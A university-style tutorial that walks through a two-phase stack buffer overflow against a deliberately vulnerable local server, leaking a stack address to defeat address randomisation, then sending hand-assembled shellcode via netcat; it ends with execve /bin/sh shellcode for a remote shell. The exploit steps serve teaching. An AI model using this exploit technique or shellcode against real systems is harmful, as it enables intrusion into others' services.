Tutorial: a trivial stack-based buffer overflow in two phases 
By H. Bos

Updated: September 2007, June 2008.
----------------------------------------------------------------------

This tutorial shows a trivial case of a two-phase attack that works on
systems with address space randomisation (ASR). The attack is a simple
network-based stack smashing exploit. The reason for writing this
tutorial is that students sometimes ask the following questions when
we are discussing the basics of buffer overflows:

     "Surely, address space randomisation makes stack overflows
     impossible?"

     "How do you know the address of the buffer containing your
     shellcode?  After all, you need this address a priori. Otherwise,
     where will you make the program jump?"

I stress that the example below is just one of many possibities and
perhaps (hopefully) the easiest one to understand. It only serves to
demonstrate how you could make a simple stack smashing attack work on
a modern Linux distribution. Note however, that it assumes that stack
smashing itself is not prevented. For instance, it will not work if
canary values are used to protect the stack. You may want to compile
with -fno-stack-protector to be sure.

Before you start, make sure to have installed the following tools (or
their equivalents): hexedit, hexdump, netcat, and nasm.

----------------------------------------------------------------------

Introduction
------------

In a 2-phase attack, a first connection is used to obtain the address
of a known value (in this case on the stack). This address is used to
calculate the appropriate address to place in the return address.

The vulnerable server is shown in vulnerable.c. It is a quick and
dirty implementation, with a bunch of debug message you may
ignore. But it works and it is, inprinciple, a real network
server. You can make the server by typing:

    make 

It should create an executable 'badbuf' that can be started with:

   badbuf <port>


For instance, start the server so as to make it listen on port 54321:

debris: ../bufferoverflow>badbuf 54321


The vulnerable function is called oops(). It looks like this:

    int oops (int newsockfd)
    {
      int len;
      char buf [56];
      int i,n;
      
      
      len = 56;
      bzero(buf,len);
      
      n = read (newsockfd, buf, 255); // overflow possible
      if (n < 0) error("ERROR reading from socket");
      
      // 'echo' the message  
      if (len>255) len = 255;
      printf ("Echoing %d characters\n", len);
      
      for (i=0; i<len; i++) {
	// pretty dumb svr: echos characters 1 at a time
	write(newsockfd, buf+i,1);
	if (n < 0) error("ERROR writing to socket");
      }
      
      return 0;
    }

A. The main idea
----------------------------------------------------------------------

Stack smashing is not complicated at all. It does require some
knowledge about how a stack frame is organised in our x86 based
machines:

- The stack grows from top (high addresses) to bottom (low-addresses).

- When a function is called the following info is found on the stack 

  * first, the parameters are pushed on the stack
    [Actually, a small no. of parameters can be passed via registers,
    but let us ignore that for now, as it is not very important for
    this tutorial.]

  * Second, the return address is pushed.
    This is the address that the CPU will jump to when the function
    returns.

  * Next, we find the saved frame pointer (or EBP, as Intel refers to
    it as 'extended base pointer'). 
    EBP points to the previous stack frame. More precisely, it points
    to the place in the previous stack frame, where *it* has saved the
    saved the previous EBP).

  * Finally, we find the space for local variables on the stack.
    Whenever the function declares a local variable (such as 'len' in
    the function 'oops()' above), the appropriate amount of memory is
    reserved.  In the case of 'len', this will be 4 bytes. In the case
    of 'buf' 56 bytes, and so on.


Note that the size of buffer 'buf' in function oops is 56B. We want to
overflow it in such a way that we get to control the program. In other
words, we want to feed it a chunk of data that overflows the buffer
'buf' and puts a new address at the location that holds the return
address of the function. Then, when the function returns, it will
return to the address we provided, rather than the location from where
the function call was made. For simplicity, we will place our
'shellcode' in buf, so we want to overflow the return address with the
address of buf. So, when the function returns, the CPU will jump to
the beginning of 'buf' and start executing the instructions that it
finds there (i.e., *our* shellcode).

Unfortunately, modern OSs use ASR, so we do not know at which address
buf resides. So, we use two-phase attack. First, we overflow the
buffer to make the program send us a stack address (the saved EBP
value). We then use this address to calculate the location of buf.


B. Finding the address to put in the return address field on the stack
----------------------------------------------------------------------

To do this we overflow the buffer in such a way that a new value is
placed in the variable 'len' (which happens to sit just above 'buf'),
which causes the program to output more data than it intended. For
instance, we send the following data to the svr (assume that we have
saved the data in the file getaddress.inp):

debris: ../bufferoverflow>hexdump -C getaddress.inp 
00000000  30 31 32 33 34 35 36 37  38 39 30 31 32 33 34 35  |0123456789012345|
00000010  36 37 38 39 30 31 32 33  34 35 36 37 38 39 30 31  |6789012345678901|
00000020  32 33 34 35 36 37 38 39  30 31 32 33 34 35 36 37  |2345678901234567|
00000030  38 39 30 31 32 33 34 35  58 00 00 00              |89012345X...|


The input contains 56 ascii characters (the numbers 0-9), followed by
0x00000058 (in little endian).  Because 'len' sits just above 'buf',
this input will overwrite 'len' with 0x58 and cause the program to
'echo' 0x58 = 88 characters, i.e., the buffer *plus* a fair share of
the stack above it. Hopefully, this yields something useful.

We send the above input using the program netcat ('nc') as follows
(client and server are both running on the same host):

debris: ../bufferoverflow>cat getaddress.inp | nc 127.0.0.1 54321 | hexdump -C
00000000  30 31 32 33 34 35 36 37  38 39 30 31 32 33 34 35  |0123456789012345|
00000010  36 37 38 39 30 31 32 33  34 35 36 37 38 39 30 31  |6789012345678901|
00000020  32 33 34 35 36 37 38 39  30 31 32 33 34 35 36 37  |2345678901234567|
00000030  38 39 30 31 32 33 34 35  58 00 00 00 3c 00 00 00  |89012345X...<...|
00000040  3c 00 00 00 d8 f5 ff bf  7a 89 04 08 04 00 00 00  |<.......z.......|
00000050  a8 f5 ff bf c8 f5 ff bf                           |........|
00000058

Yes, we found something useful: the saved EBP. It is the address 'd8
f5 ff bf' in line 00000040. How do I know this is the appropriate
address? Well, it is the first 4 byte number that *looks* like a stack
address above the 'buf' and 'len' variables. It is followed by a 4
bytes number that looks like an instruction address, so we are
probably on the right track. You may wonder about the two 4B values
between 'len' and 'saved EBP'. Apparently, the compiler reserved this
space here for other variables. (It is not very important, but you may
suspect that it corresponds to the amount of data that was read, as
the value is 0x3C = 60 bytes, which is exactly the amount of data in
getaddress.inp.)


As mentioned earlier, the 'old EBP' value saved on the stack points to
a specific place in the previous stack frame. Let us see:

    d8 f5 ff bf in little endian -> bffff5d8

We know the program, so we are able to find out the difference between
the previous EBP and the current location where EBP was stored. (If
you don't know this precisely, it is not so hard to find, either by
analysis, or by trial and error). In my case, this happens to be 0x50
= 80. Now, the difference with the start of buf can also be easily
calculated:

EBP was saved at 0xbffff5d8-0x50 = 0xbffff588. We know (and/or see
from our hexdump above) that the start of buffer is 68B below the
address at which EBP was stored, so we have to patch in the address:

0xbffff588 - 0x44 = 0xbffff544

I wrote a small shell script to calculate this. Simply copy in the
bytes as reported by the hexdump output above and the result (in the
most useful order will be printed):

debris: ../bufferoverflow>calcAddr.sh d8 f5 ff bf 
44 F5 FF BF
debris: ../bufferoverflow>

These hex numbers will be used later on.


      *** SHORTCUT: if you hate typing and want to be really efficient, you
      	  can use the following (somewhat cryptic command):

        ./calcAddr.sh `cat getaddress.inp | nc 127.0.0.1 54321 | hexdump -C | grep -m 1 -o -G [0-9a-f][0-9a-f][[:space:]][0-9a-f][0-9a-f][[:space:]][0-9a-f][0-9a-f][[:space:]]bf

    	  This invokes calcAddr.sh on the first occurrence of an
	  address like ?? ?? ?? bf in whatever we receive from the
	  server. Don't you just love Unix?

B. The shellcode
----------------------------------------------------------------------

Now we must provide a bit of 'shellcode' to be executed and patch in
the return addres that we just calculated at the appropriate place.
We will do this using hexedit. Again, we want to send the shellcode in
an input and with that same input overflow the return address to make
the CPU return to the start of 'buf' (which by then contains the
shellcode). So the malicious input we will generate looks like this:

|----------|
| 44F5FFBF |
|----------|
|          |
|          |
|shellcode |
|          |
|          |
|----------|


The shellcode.asm should be suitable for this vulnerability. It is
easily small enough to fit in the 56B buffer. It does not do much
(just prints 'hello world'), but that is not the point.

Writing good shellcode is an art, but a bit of knowledge of assembly
should go a long way. This is our program in assembly:

[SECTION .text]
global _start
_start:
        jmp short stringaddress
mystart:
        xor eax, eax    ;clean up the registers
        xor ebx, ebx
        xor edx, edx
        xor ecx, ecx
        mov al, 4       ;syscall 4 means a write
        mov bl, 1       ;stdout is 1
        pop ecx         ;get the address of the string from the stack
        mov dl, 13      ;length of the string
        int 0x80        ;do syscall
        xor eax, eax
        mov al, 1       ;syscall 1=exit (so we exit the shellcode)
        xor ebx,ebx
        int 0x80
stringaddress:
        call mystart    ;puts the address of the string on the stack :)
        db "hello world!"


Now we want to get the machine code that corresponds to this code:

debris: ../bufferoverflow>nasm -felf shellcode.asm
debris: ../bufferoverflow>ld -s -o scode shellcode.o
debris: ../bufferoverflow>objdump -d scode        

h:     file format elf32-i386

Disassembly of section .text:

08048060 <.text>:
 8048060:       eb 19                   jmp    0x804807b
 8048062:       31 c0                   xor    %eax,%eax
 8048064:       31 db                   xor    %ebx,%ebx
 8048066:       31 d2                   xor    %edx,%edx
 8048068:       31 c9                   xor    %ecx,%ecx
 804806a:       b0 04                   mov    $0x4,%al
 804806c:       b3 01                   mov    $0x1,%bl
 804806e:       59                      pop    %ecx
 804806f:       b2 0d                   mov    $0xd,%dl
 8048071:       cd 80                   int    $0x80
 8048073:       31 c0                   xor    %eax,%eax
 8048075:       b0 01                   mov    $0x1,%al
 8048077:       31 db                   xor    %ebx,%ebx
 8048079:       cd 80                   int    $0x80
 804807b:       e8 e2 ff ff ff          call   0x8048062
 8048080:       68 65 6c 6c 6f          push   $0x6f6c6c65
 8048085:       20 77 6f                and    %dh,0x6f(%edi)
 8048088:       72 6c                   jb     0x80480f6
 804808a:       64                      fs
 804808b:       21                      .byte 0x21
 804808c:       5c                      pop    %esp
 804808d:       6e                      outsb  %ds:(%esi),(%dx)

Ok, that is just what we need. Let us stick the numbers in the middle
column in a file and call it shellcode.inp:

debris: ../bufferoverflow>hexedit shellcode.inp

00000000   EB 19 31 C0  31 DB 31 D2  31 C9 B0 04  B3 01 59 B2  ..1.1.1.1.....Y.
00000010   0C CD 80 31  C0 B0 01 31  DB CD 80 E8  E2 FF FF FF  ...1...1........
00000020   68 65 6C 6C  6F 20 77 6F  72 6C 64 20  0C

We still have to make sure to add the return address at the appropriate
offset. The return address was calculated under (B). We place at the
location that is just 4B up from where we found the save value of EBP
(i.e., at offset 0x48).

00000000   EB 19 31 C0  31 DB 31 D2  31 C9 B0 04  B3 01 59 B2  ..1.1.1.1.....Y.
00000010   0C CD 80 31  C0 B0 01 31  DB CD 80 E8  E2 FF FF FF  ...1...1........
00000020   68 65 6C 6C  6F 20 77 6F  72 6C 64 20  0C 00 00 00  hello world ....
00000030   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ................
00000040   00 00 00 00  00 00 00 00  44 F5 FF BF               ........D...


Now our exploit is ready. Let us send it to the badbuf server that is
still running:

debris: ../bufferoverflow>cat shellcode.inp | nc 127.0.0.1 54321

At the server side, the result is that the server prints 'hello world'
and exits. The full run is shown below (it includes the output
generated on behalf of the first connection):

debris: ../bufferoverflow>badbuf 54321
Echoing 88 characters
returned
Echoing 0 characters
hello world debris: ../bufferoverflow>

The exploit worked! This is the end of the tutorial. We just have some
additional comments.


*** SHORTCUT NOTE: use the script './attack.sh <port>' if you want to
    automate this entire procedure. The script will send
    getaddress.inp, extract the address of EBP, calculate the address
    of our buffer, patch in the address in shellcode.inp, and send it
    to the server.

*** The hello world example shown above of course cannot be termed
    'shellcode' as it does not give you a shell. The following
    shellcode is more interesting. As I am switching from nasm to as,
    i will give this example in gnu syntax:
		  
.section .text
.global _start

_start:	
	/* we first jump to string address and then immediately return
	via a call, so that when we arrive at mystart, the address of
	the string will be on the stack. Clever. */
	jmp string_addr 	

mystart:
	pop %ebx 		/* get the string address */	
	xor %eax,%eax		/* zero eax */

	movb %al, 7(%ebx)	/* move a NULL in 'N' position of the string */
	movl %ebx, 8(%ebx)	/* mov the address of the string in XXXX */

	movl %eax, 12(%ebx)	/* mov 0 (32b) in YYYY */
	
	movb $11,%al		/* syscall 11 = execve */

	/* first argument (ebx) points to the file */
	leal 8(%ebx), %ecx	/* address of second argument in ecx*/
	leal 12(%ebx), %edx	/* address of third argument in ecx*/

	int $0x80		/* do it */

string_addr:
	call mystart
	.asciz "/bin/shNXXXXYYYY"


	If you use this instead of the helloworld example you will get
	an actual shell on the server.

Have fun!  
HJB
